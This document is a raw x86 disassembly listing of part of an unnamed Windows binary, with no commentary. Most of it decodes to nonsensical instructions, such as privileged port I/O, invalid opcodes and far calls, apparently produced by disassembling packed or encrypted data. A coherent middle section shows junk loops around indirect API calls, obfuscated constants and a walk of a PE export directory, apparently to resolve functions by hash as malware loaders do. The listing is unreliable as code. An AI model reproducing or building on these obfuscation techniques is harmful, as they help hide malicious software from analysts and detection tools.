  410925:	test   DWORD PTR [ebp-0x37],esp
  410928:	repnz test BYTE PTR [esi+0xc52da9b],cl
  41092f:	cmc    
  410930:	fisttp QWORD PTR [esp+ebx*4+0x180b0160]
  410937:	fcom   st(6)
  410939:	mov    al,0x3b
  41093b:	retf   
  41093c:	in     al,dx
  41093d:	lods   eax,DWORD PTR ds:[esi]
  41093e:	fiadd  DWORD PTR [ecx-0x766e58ea]
  410944:	cmp    bh,BYTE PTR [esi+0x5b]
  410947:	cmp    bl,BYTE PTR [edx+0x5a]
  41094a:	popa   
  41094b:	mov    BYTE PTR cs:[edx],dl
  41094e:	fistp  WORD PTR [ebp+0x6e71835b]
  410954:	pop    esp
  410955:	test   dh,ah
  410957:	shl    BYTE PTR [esi+0x1b],1
  41095a:	ret    0x2df6
  41095d:	mov    eax,esp
  41095f:	inc    ecx
  410960:	call   0x415e:0x2058e7e0
  410967:	pusha  
  410968:	sub    al,0xf3
  41096a:	ds pop ss
  41096c:	sahf   
  41096d:	pop    ecx
  41096e:	fnsave [edi-0x68]
  410971:	xchg   esp,eax
  410972:	arpl   WORD PTR [ebp+0x19],bx
  410975:	mov    ch,0xf3
  410977:	test   DWORD PTR [ecx],ebx
  410979:	pop    ds
  41097a:	add    al,0xc2
  41097c:	out    dx,eax
  41097d:	jne    0x4109b8
  41097f:	and    edx,0xfffffffe
  410982:	fwait
  410983:	xchg   BYTE PTR [esi+0x53178d97],dh
  410989:	cmc    
  41098a:	jmp    DWORD PTR [eax-0x551cbe5c]
  410990:	fwait
  410991:	xor    eax,eax
  410993:	loop   0x410932
  410995:	mov    bh,BYTE PTR [edx]
  410997:	pop    ecx
  410998:	lahf   
  410999:	inc    BYTE PTR [ecx+ebx*2+0x18]
  41099d:	mov    al,0xf3
  41099f:	push   esi
  4109a0:	in     al,dx
  4109a1:	lahf   
  4109a2:	sbb    al,0x2e
  4109a4:	fdiv   QWORD PTR [ecx+0x45]
  4109a7:	shr    BYTE PTR [ebp-0x3242fbab],cl
  4109ad:	mov    al,ds:0x7d93ed3
  4109b2:	dec    edi
  4109b3:	push   ebp
  4109b4:	xchg   edx,eax
  4109b5:	push   eax
  4109b6:	loopne 0x410a05
  4109b8:	dec    esi
  4109b9:	cmp    al,0x25
  4109bb:	pop    es
  4109bc:	xchg   ebx,eax
  4109bd:	dec    esp
  4109be:	add    DWORD PTR [ebx-0x72],0xfffffff6
  4109c2:	push   edi
  4109c3:	dec    ebp
  4109c4:	nop
  4109c5:	pushf  
  4109c6:	mov    ds:0xd0c6d994,eax
  4109cb:	xchg   ebx,eax
  4109cc:	pop    ss
  4109cd:	mov    eax,ds:0xfcd80968
  4109d2:	push   ecx
  4109d3:	jae    0x4109be
  4109d5:	inc    ecx
  4109d6:	shl    DWORD PTR [esi+0xfca3b66],1
  4109dc:	test   DWORD PTR [ebp-0x24],ecx
  4109df:	(bad)  
  4109e0:	dec    DWORD PTR [ebx+0x4244350d]
  4109e6:	add    BYTE PTR [ebx+0x19889],cl
  4109ec:	add    BYTE PTR [ecx+0x21e901],cl
  4109f2:	add    BYTE PTR [eax],al
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx-0x4c329d61],0x28
  410fc4:	mov    gs,WORD PTR [esi]
  410fc6:	scas   al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x410fbd
  410fce:	and    ah,BYTE PTR [edi+0x77]
  410fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fd2:	aaa    
  410fd3:	out    dx,al
  410fd4:	or     DWORD PTR [ebp-0x239882bd],ebx
  410fda:	add    dl,BYTE PTR [ebx-0x7f]
  410fdd:	add    BYTE PTR [eax],0x58
  410fe0:	or     eax,0x94323edc
  410fe5:	int    0x5
  410fe7:	mov    ds:0x8b3f6a12,eax
  410fec:	jo     0x41106a
  410fee:	imul   esi,DWORD PTR [esi+0x4fae65e8],0xe9ac9f10
  410ff8:	ret    
  410ff9:	das    
  410ffa:	hlt    
  410ffb:	in     al,0x12
  410ffd:	imul   ebx,DWORD PTR [ebx+0x6bdf8f2],0xffffffc2
  411004:	cmp    DWORD PTR [edi+0x4bc788c],0xffffffa0
  41100b:	and    dh,BYTE PTR [edx-0x35fa9cf2]
  411011:	add    al,0x7a
  411013:	outs   dx,BYTE PTR ds:[esi]
  411014:	jnp    0x41105f
  411016:	ds mov ah,0xa6
  411019:	ret    
  41101a:	iret   
  41101b:	add    BYTE PTR [edx-0x7e411936],ah
  411021:	dec    ebx
  411022:	and    DWORD PTR [edi],edx
  411024:	adc    ch,ah
  411026:	sbb    dh,BYTE PTR [edx]
  411028:	sbb    BYTE PTR [eax+0x51b15d2],dl
  41102e:	stc    
  41102f:	cdq    
  411030:	push   edi
  411031:	dec    edx
  411032:	and    DWORD PTR [edi],eax
  411034:	nop
  411035:	and    ebp,DWORD PTR [edi+0x2c]
  411038:	lahf   
  411039:	cmp    ah,BYTE PTR [edi-0x6f95115e]
  41103f:	rcl    DWORD PTR ds:0x1b5d816f,0xc5
  411046:	sbb    ecx,eax
  411048:	mov    BYTE PTR [ebp+0x49],cl
  41104b:	push   esp
  41104c:	xchg   DWORD PTR [ecx],esp
  41104e:	mov    ds:0x7d58a795,eax
  411053:	fnstenv [ebx+0x4e]
  411056:	popa   
  411057:	sbb    al,0x24
  411059:	adc    dl,BYTE PTR [ebx+0x62]
  41105c:	cld    
  41105d:	std    
  41105e:	or     ch,al
  411060:	mov    dl,0x2e
  411062:	popf   
  411063:	stos   BYTE PTR es:[edi],al
  411064:	sbb    al,0xc5
  411066:	cmp    edi,0xffffffde
  411069:	stc    
  41106a:	mov    edi,0xb9c92b8c
  41106f:	int    0x2b
  411071:	mov    cl,0xa0
  411073:	xchg   DWORD PTR [ecx+edx*4-0x68],esp
  411077:	rcl    dl,1
  411079:	or     al,0x57
  41107b:	jo     0x41105e
  41107d:	mov    WORD PTR [edi],ss
  41107f:	repz leave 
  411081:	jae    0x4110b7
  411083:	pop    esi
  411084:	cmp    BYTE PTR [esi-0x27168925],dh
  41108a:	xchg   edi,eax
  41108b:	ret    0x9d11
  41108e:	pop    eax
  41108f:	push   eax
  411090:	mov    ch,0x35
  411092:	jnp    0x4110b6
  411094:	pushf  
  411095:	cmp    al,0xbf
  411098:	in     eax,dx
  411099:	sub    bh,cl
  41109b:	push   ebp
  41109c:	imul   ecx,DWORD PTR [edx],0xffffffe0
  41109f:	mov    ?,WORD PTR [edi]
  4110a1:	cmp    eax,0x6aa83fae
  4110a6:	add    ecx,DWORD PTR [edi+esi*1]
  4110a9:	inc    ecx
  4110aa:	push   ecx
  4110ab:	lods   eax,DWORD PTR ds:[esi]
  4110ac:	shl    ebx,0x61
  4110af:	or     DWORD PTR [edx],edi
  4110b1:	mov    ds:0x29e8dc8e,al
  4110b6:	jne    0x41105c
  4110b8:	sub    eax,0xb6cd56e2
  4110bd:	or     BYTE PTR [edi+0x74],0xb8
  4110c1:	adc    eax,0xbcd95c3
  4110c6:	int3   
  4110c7:	aas    
  4110c8:	out    0x51,eax
  4110ca:	jmp    0x64ef4796
  4110cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110d0:	push   cs
  4110d1:	cs in  eax,0x91
  4110d4:	push   ebx
  4110d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110d6:	mov    bl,0x1c
  4110d8:	and    eax,0x1b5f9064
  4110dd:	xor    cl,0x2f
  4110e0:	aas    
  4110e1:	das    
  4110e2:	dec    eax
  4110e3:	pusha  
  4110e4:	nop
  4110e5:	xchg   cl,dh
  4110e7:	loop   0x411085
  4110e9:	fadd   st,st(3)
  4110eb:	gs mov ebx,0x72cba448
  4110f2:	adc    DWORD PTR [esi],esi
  4110f4:	and    eax,0xc2bc58ee
  4110f9:	add    ebx,DWORD PTR [edi+0x71]
  4110fc:	xor    ecx,0x832931d0
  411102:	lds    ecx,FWORD PTR [esi]
  411104:	or     al,BYTE PTR [ebp+0x5e30a343]
  41110a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41110b:	inc    esp
  41110c:	outs   dx,BYTE PTR ds:[esi]
  41110d:	or     al,0x42
  41110f:	mov    ds:0x1927f686,al
  411114:	pushf  
  411115:	sbb    eax,0xccf69b51
  41111a:	inc    si
  41111c:	je     0x4110e5
  41111e:	out    dx,eax
  41111f:	cmp    DWORD PTR [eax],edx
  411121:	inc    ebp
  411122:	mov    ah,0xf8
  411124:	xchg   esi,esp
  411126:	add    bl,bl
  411128:	pop    ebx
  411129:	push   ebx
  41112a:	scas   eax,DWORD PTR es:[edi]
  41112b:	adc    esi,DWORD PTR [edx]
  41112d:	lea    ebx,[edx-0x7c]
  411130:	add    al,0x5c
  411132:	rol    DWORD PTR [edi],0x42
  411135:	icebp  
  411136:	clc    
  411137:	mov    fs,WORD PTR [ecx-0x35]
  41113a:	push   esp
  41113b:	cdq    
  41113c:	ficomp DWORD PTR [ecx]
  41113e:	mov    dl,0xcb
  411140:	pop    ebp
  411141:	aam    0x5
  411143:	xchg   esp,ecx
  411145:	bound  ebx,QWORD PTR [ecx-0x2ded69be]
  41114b:	call   0x6aa9:0x784ad662
  411152:	sahf   
  411153:	inc    edx
  411154:	or     BYTE PTR [esi],cl
  411156:	fidiv  WORD PTR [esi+ebx*1]
  411159:	addr16 and bh,dh
  41115c:	adc    eax,esp
  41115e:	sbb    bl,BYTE PTR [esi+0x71]
  411161:	push   edx
  411162:	add    al,BYTE PTR [ecx-0x768b1ad0]
  411168:	xor    al,0xc0
  41116a:	cmp    DWORD PTR [ebx-0x12],esp
  41116d:	leave  
  41116e:	imul   edi,DWORD PTR [eax],0xffffffba
  411171:	adc    esi,DWORD PTR [edx]
  411173:	out    0x44,eax
  411175:	jl     0x4111b8
  411177:	js     0x41116a
  411179:	inc    eax
  41117a:	mov    ds:0x9ca404a7,al
  41117f:	(bad)
  411183:	jecxz  0x411174
  411185:	sbb    esi,DWORD PTR [ecx+0x1b]
  411188:	inc    esi
  411189:	js     0x41110d
  41118b:	fwait
  41118c:	mov    eax,0x585f14d7
  411191:	jecxz  0x4111b9
  411193:	xchg   ecx,eax
  411194:	mov    edi,0x771a30fc
  411199:	retf   
  41119a:	push   esi
  41119b:	test   DWORD PTR [edi],0x48048d14
  4111a1:	jl     0x41112e
  4111a3:	dec    ecx
  4111a4:	lahf   
  4111a5:	aad    0x15
  4111a7:	call   0xef55:0x858d6d2e
  4111ae:	pop    esp
  4111af:	push   0x7b5b08b7
  4111b4:	scas   al,BYTE PTR es:[edi]
  4111b5:	add    al,dl
  4111b7:	(bad)  [ebp+0xd556dc0]
  4111bd:	fld    QWORD PTR [esi+0x4144b4d6]
  4111c3:	xchg   DWORD PTR [ebp-0x578e7d92],ebp
  4111c9:	rol    BYTE PTR [ebx-0x72],cl
  4111cc:	xor    dl,BYTE PTR ds:[eax-0x24a61a8]
  4111d3:	jecxz  0x41119e
  4111d5:	add    ch,0x2c
  4111d8:	xlat   BYTE PTR ds:[ebx]
  4111d9:	push   0xffffffbd
  4111db:	sub    eax,0xd57756
  4111e0:	pop    esp
  4111e1:	popf   
  4111e2:	popf   
  4111e3:	xchg   BYTE PTR [esi-0x5cfe02c9],dl
  4111e9:	and    edi,ecx
  4111eb:	mov    ah,0xe2
  4111ed:	pop    edi
  4111ee:	(bad)  
  4111ef:	sub    ch,BYTE PTR [ebx-0x6c]
  4111f2:	sahf   
  4111f3:	xchg   edi,eax
  4111f4:	rcl    DWORD PTR [ebx+0x57a92256],0xdf
  4111fb:	pop    esp
  4111fc:	push   cs
  4111fd:	xchg   ecx,eax
  4111fe:	test   DWORD PTR [edx],edi
  411200:	xchg   edi,eax
  411201:	mov    ebx,edi
  411203:	dec    esi
  411204:	xchg   edi,eax
  411205:	into   
  411206:	punpckhwd mm2,QWORD PTR [esi-0x45dc4a62]
  41120d:	mov    ds:0x73687173,eax
  411212:	leave  
  411213:	mov    ds:0x466a955,al
  411218:	ret    0xfdae
  41121b:	test   BYTE PTR [ebp+0x3e49ee7],cl
  411221:	sbb    DWORD PTR ds:0xa03d2a3c,edx
  411227:	fucom  st(2)
  411229:	and    DWORD PTR [ecx-0x6],ebp
  41122c:	shl    DWORD PTR [edx],1
  41122e:	jbe    0x4111ca
  411230:	xor    DWORD PTR [ebx+0x3d],0x23d8c8a1
  411237:	test   DWORD PTR ds:0x2d8feed8,ebx
  41123d:	out    0xbe,al
  41123f:	dec    ebp
  411240:	add    DWORD PTR [edx+edi*4],edi
  411243:	mov    ebp,0xdc838353
  411248:	xchg   esp,eax
  411249:	gs pop esp
  41124b:	pop    esi
  41124c:	scas   al,BYTE PTR es:[edi]
  41124d:	xchg   esi,eax
  41124e:	push   cs
  41124f:	mov    eax,0x7f6025c4
  411254:	mov    al,ds:0x93252c32
  411259:	mov    ebp,0x17363526
  41125e:	push   eax
  41125f:	sub    BYTE PTR [eax+esi*2-0x73],dl
  411263:	(bad)  
  411265:	xchg   DWORD PTR [eax+0x11],ebp
  411268:	sbb    ebx,ecx
  41126a:	mov    edx,0x564e94eb
  41126f:	mov    dl,0xb6
  411271:	mov    edi,0xff3e0be3
  411276:	mov    ?,esi
  411278:	add    eax,0x63f5d99a
  41127d:	shr    DWORD PTR [edx+0x14],0xe0
  411281:	into   
  411282:	mov    bl,0x86
  411284:	sub    eax,0x5eb153b0
  411289:	mov    edx,0xc9445aca
  41128e:	inc    ebx
  41128f:	add    eax,0x13552bc2
  411294:	mov    esp,0x7ecacac3
  411299:	cmp    DWORD PTR [edi-0x2f0f730],ecx
  41129f:	repz popa 
  4112a1:	cmp    DWORD PTR [eax*1+0x4d00c4e5],ebx
  4112a8:	sar    BYTE PTR [eax-0x5fb46b32],cl
  4112ae:	mov    dl,0x5f
  4112b0:	iret   
  4112b1:	out    dx,eax
  4112b2:	scas   al,BYTE PTR es:[edi]
  4112b3:	aad    0x59
  4112b5:	jns    0x411329
  4112b7:	or     al,0xf4
  4112b9:	mov    esp,0x5f2825b3
  4112bf:	fiadd  WORD PTR [ecx+0x696f76d3]
  4112c5:	scas   al,BYTE PTR es:[edi]
  4112c6:	mov    dl,0x24
  4112c8:	dec    ebx
  4112c9:	xchg   DWORD PTR [edx+0x68e1cfd6],edx
  4112cf:	enter  0xcc6a,0x2a
  4112d3:	push   edi
  4112d4:	push   0x16
  4112d6:	inc    ebp
  4112d7:	mov    eax,0x1d4cefc0
  4112dc:	pop    edi
  4112dd:	lods   al,BYTE PTR ds:[esi]
  4112de:	cmc    
  4112df:	pop    ebp
  4112e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e1:	pop    esp
  4112e2:	mov    ecx,0x2b9d39c3
  4112e7:	rol    eax,0xe7
  4112ea:	into   
  4112eb:	mov    ebp,DWORD PTR [ebp-0x67]
  4112ee:	sbb    eax,0x79d2a223
  4112f3:	int3   
